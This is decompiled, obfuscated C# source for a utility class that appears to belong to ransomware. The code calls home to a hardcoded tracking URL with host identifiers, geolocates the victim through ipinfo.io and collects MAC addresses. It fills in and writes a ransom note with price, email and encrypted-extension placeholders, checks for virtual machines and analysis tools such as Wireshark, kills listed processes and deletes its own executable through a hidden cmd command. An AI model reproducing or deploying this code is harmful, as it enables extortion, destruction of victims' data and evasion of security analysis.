using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;
using ns1;

namespace Main;

internal sealed class Miscellaneous
{
	[CompilerGenerated]
	private sealed class Class13
	{
		public Random random_0;

		internal char method_0(string string_0)
		{
			return string_0[random_0.Next(string_0.Length)];
		}
	}

	public static string smethod_0(byte[] byte_0)
	{
		return Convert.ToBase64String(byte_0);
	}

	public static string smethod_1(byte[] byte_0)
	{
		char[] array = new char[byte_0.Length * 2];
		int num = 0;
		int num2 = 0;
		while (num < byte_0.Length)
		{
			byte b = (byte)(byte_0[num] >> 4);
			array[num2] = (char)((b > 9) ? (b + 55 + 32) : (b + 48));
			b = (byte)(byte_0[num] & 0xFu);
			array[++num2] = (char)((b > 9) ? (b + 55 + 32) : (b + 48));
			num++;
			num2++;
		}
		return new string(array);
	}

	public static int smethod_2(string string_0)
	{
		try
		{
			return Convert.ToInt32(string_0, 16);
		}
		catch (Exception)
		{
			return -1;
		}
	}

	public static byte[] smethod_3(byte[] byte_0, byte[] byte_1, int int_0, int int_1)
	{
		try
		{
			return new Rfc2898DeriveBytes(byte_0, byte_1, int_0).GetBytes(int_1);
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static byte[] smethod_4(byte[][] byte_0)
	{
		byte[] array = new byte[byte_0.Sum((byte[] byte_0) => byte_0.Length)];
		int num = 0;
		foreach (byte[] array2 in byte_0)
		{
			Buffer.BlockCopy(array2, 0, array, num, array2.Length);
			num += array2.Length;
		}
		return array;
	}

	public static void smethod_5(string string_0 = "", string string_1 = "http://blasze.tk/CN18R3")
	{
		try
		{
			HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(string_1);
			obj.Timeout = 10000;
			obj.AllowAutoRedirect = true;
			obj.UserAgent = $"{Class6.Class7.smethod_16()}-{Class6.Class7.smethod_26()}:{string_0}";
			HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
			new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
		}
		catch (Exception)
		{
		}
	}

	public static string smethod_6()
	{
		string text = "";
		int num = 0;
		do
		{
			try
			{
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("https://ipinfo.io/json");
				obj.Timeout = 10000;
				obj.UserAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko";
				HttpWebResponse httpWebResponse = (HttpWebResponse)obj.GetResponse();
				text = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.GetEncoding(httpWebResponse.CharacterSet)).ReadToEnd();
			}
			catch (Exception)
			{
			}
			num++;
			if (string.IsNullOrEmpty(text) && num >= 3)
			{
				return null;
			}
		}
		while (string.IsNullOrEmpty(text));
		return Regex.Split(text, "\"ip\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"org\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"city\": \"")[1].Split(new char[1] { '"' })[0] + char.ToString(',') + Regex.Split(text, "\"country\": \"")[1].Split(new char[1] { '"' })[0];
	}

	public static string smethod_7()
	{
		string empty = string.Empty;
		try
		{
			NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
			foreach (NetworkInterface networkInterface in allNetworkInterfaces)
			{
				if (networkInterface.OperationalStatus == OperationalStatus.Up)
				{
					empty += networkInterface.GetPhysicalAddress().ToString();
					string[] array = new string[empty.Length];
					for (int j = 0; j < empty.Length; j++)
					{
						array[j] = Encoding.UTF8.GetBytes(empty)[j].ToString("x2");
					}
					return string.Join(":", array);
				}
			}
			return empty;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string smethod_8(int int_0, bool bool_0 = false)
	{
		Random random_0 = new Random();
		string text = "";
		text = ((!bool_0) ? "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ");
		return new string((from string_0 in Enumerable.Repeat(text, int_0)
			select string_0[random_0.Next(string_0.Length)]).ToArray());
	}

	public static byte[] smethod_9(int int_0)
	{
		byte[] array = new byte[int_0];
		new RNGCryptoServiceProvider().GetNonZeroBytes(array);
		return array;
	}

	public static string smethod_10(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static string smethod_11(string string_0, int int_0)
	{
		double num = Math.Ceiling((double)string_0.Length / (double)int_0);
		if (num < 2.0)
		{
			return string_0;
		}
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; (double)i < num; i++)
		{
			if (i > 0)
			{
				stringBuilder.Append(Environment.NewLine);
			}
			int num2 = i * int_0;
			int length = Math.Min(int_0, string_0.Length - num2);
			string value = string_0.Substring(num2, length);
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static void smethod_12(string string_0)
	{
		try
		{
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Encrypted", Class6.Class7.smethod_0().Replace(Environment.NewLine, "<br>")));
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Extension", "." + Convert.ToString(Class6.Class7.smethod_6())));
			string replacement = Class4.Class5.smethod_34().ToString().Replace(",", ".");
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Price", replacement));
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Unit", Convert.ToString(Class4.Class5.smethod_36())));
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Email", Class4.Class5.smethod_30()));
			Class4.Class5.smethod_65(Regex.Replace(Class4.Class5.smethod_64(), "%Alternative", Class4.Class5.smethod_32()));
			string_0 = Path.Combine(string_0, Class4.Class5.smethod_60()) + "-" + Class6.Class7.smethod_6() + "." + Class4.Class5.smethod_62();
			using (TextWriter textWriter = File.CreateText(string_0))
			{
				textWriter.Write(Class4.Class5.smethod_64());
				textWriter.Close();
			}
			File.SetAttributes(string_0, FileAttributes.ReadOnly);
			File.SetAttributes(string_0, FileAttributes.Compressed);
		}
		catch (Exception)
		{
		}
	}

	public static void smethod_13(int int_0)
	{
		try
		{
			string arg = string.Concat("ping 127.0.0.1 -n 3 > NUL&&" + $"del /Q /F /S \"{Application.get_ExecutablePath()}\"");
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.Arguments = $"/C {arg}";
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
			Environment.Exit(int_0);
		}
		catch (Exception)
		{
		}
	}

	public static bool smethod_14()
	{
		try
		{
			string text = "";
			text = smethod_10("wmic", "path win32_VideoController get name");
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			smethod_10("tasklist", "m");
			if (text.Contains("VirtualBox Graphics Adapter") || text.Contains("VMware SVGA") || text.Contains("Parallels Video Adapter") || text.Contains("PVM Additions S3 Trio32/64") || text.Contains("S3 Trio32/64") || smethod_16("xenservice") || smethod_16("VMSrvc") || smethod_16("VMUSrvc") || smethod_16("VBoxTrayToolWndClass") || smethod_16("VBoxTrayToolWnd") || smethod_16("vmtoolsd") || smethod_16("vmwaretray") || smethod_16("vmwareuser") || smethod_16("VGAuthService") || smethod_16("vmacthlp") || smethod_16("prl_cc") || smethod_16("prl_tools") || smethod_16("vmtoolsd"))
			{
				text = smethod_10("wmic", "path MSAcpi_ThermalZoneTemperature");
			}
			if (string.IsNullOrEmpty(text))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool smethod_15()
	{
		try
		{
			if (!smethod_16("Sysinternals: www.sysinternals.com") && !smethod_16("wireshark") && !smethod_16("EtherD") && !smethod_16("EtherDetect") && !smethod_16("The Wireshark Network Analyzer") && !smethod_16("dumpcap") && !smethod_16("sysAnalyzer") && !smethod_16("TCPView") && !smethod_16("C:\\Program Files\\Wireshark\\") && !smethod_16("NETSTAT") && !smethod_16("sniff_hit"))
			{
				return false;
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static bool smethod_16(string string_0)
	{
		try
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.MainWindowTitle.Contains(string_0) || process.ProcessName.Contains(string_0))
				{
					process.Dispose();
					GC.Collect();
					GC.WaitForPendingFinalizers();
					GC.Collect();
					bool flag = true;
				}
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	private static string smethod_17(string string_0, string string_1)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0);
			processStartInfo.Arguments = string_1;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			process.StartInfo = processStartInfo;
			process.Start();
			string result = process.StandardOutput.ReadToEnd();
			process.WaitForExit();
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static bool smethod_18(string[] string_0)
	{
		try
		{
			string[] array = smethod_17("tasklist", "/V /FO CSV").Split(new string[3] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
			List<string> list = new List<string>();
			for (int i = 0; i < array.Length; i++)
			{
				string text = array[i].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "");
				if (!(text == "") && text.Contains(".exe"))
				{
					list.Add(array[i].Split(new char[1] { ',' })[0].ToLower().Replace("\"", "").Replace(".exe", ""));
				}
			}
			string[] array2 = list.ToArray();
			foreach (string text2 in array2)
			{
				if (string_0.Contains(text2))
				{
					smethod_10("taskkill", $"/F /IM {text2}.exe");
				}
			}
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string smethod_19()
	{
		string text = "";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Keyboard Layout\\Preload");
			string[] valueNames = registryKey.GetValueNames();
			foreach (string name in valueNames)
			{
				text = text + $"{smethod_2((string)registryKey.GetValue(name))}" + ",";
			}
		}
		catch (Exception)
		{
		}
		return text.TrimEnd(new char[1] { ',' });
	}

	public static bool smethod_20()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Console", writable: true);
			if (Registry.GetValue(registryKey.ToString(), "WordLoad", null) == null)
			{
				registryKey.SetValue("WordLoad", 1, RegistryValueKind.DWord);
				return true;
			}
			return false;
		}
		catch (Exception)
		{
		}
		return false;
	}

	public static bool smethod_21(string string_0)
	{
		try
		{
			if (string_0.Contains(".exe"))
			{
				string_0 = string_0.Replace(".exe", "");
			}
			if (Process.GetProcessesByName(string_0).Length != 0)
			{
				return true;
			}
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
